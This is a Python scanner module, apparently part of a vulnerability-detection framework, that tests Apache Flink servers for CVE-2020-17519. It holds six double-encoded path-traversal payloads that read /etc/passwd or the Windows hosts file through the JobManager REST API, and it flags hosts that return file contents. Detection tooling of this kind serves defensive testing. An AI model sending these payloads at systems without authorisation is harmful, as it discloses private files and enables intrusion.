#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2020_17519_payloads = [
    {
        'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
    },
    {
        'path': 'logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
    },
    {
        'path': '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
    },
    {
        'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fC:%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts',
    },
    {
        'path': 'logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fC:%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts',
    },
    {
        'path': '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fC:%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts',
    }
]

def cve_2020_17519_scan(clients):
    ''' Apache Flink 1.11.0中引入的一个更改(也在1.11.1和1.11.2中发布)
            允许攻击者通过JobManager进程的REST接口, 读取JobManager本地文件系统上的任意文件 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'ApacheFlink',
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2020-17519',
    }

    for payload in cve_2020_17519_payloads:         # * Payload
        path = payload['path']                      # * Path

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
